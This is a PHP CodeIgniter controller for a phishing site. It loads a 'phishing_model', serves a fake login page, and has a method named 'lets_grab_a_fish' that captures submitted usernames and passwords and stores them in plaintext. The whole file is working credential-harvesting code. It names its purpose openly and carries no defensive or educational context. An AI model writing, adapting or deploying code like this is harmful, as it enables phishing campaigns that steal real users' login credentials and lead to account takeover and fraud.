<?php if(!defined('BASEPATH'))exit('No direct scripts allowed');

class Login extends CI_Controller{
	
	public function __construct(){
		parent::__construct();
		$this->load->database();
		$this->load->model('phishing_model');
	}

	public function index(){
		$this->load->view('loginPage');
	}

	public function lets_grab_a_fish(){
		$username = $this->input->post('username');
		$password = $this->input->post('password');
		$data 	  = array(
						'Username' => $username,
						'Password' => $password
					);
		$result = $this->phishing_model->fill_fish_credentials($data);
		if($result){
			echo json_encode("true");
			return;
		}
		else{
			echo json_encode("false");
			return;
		}
	}
}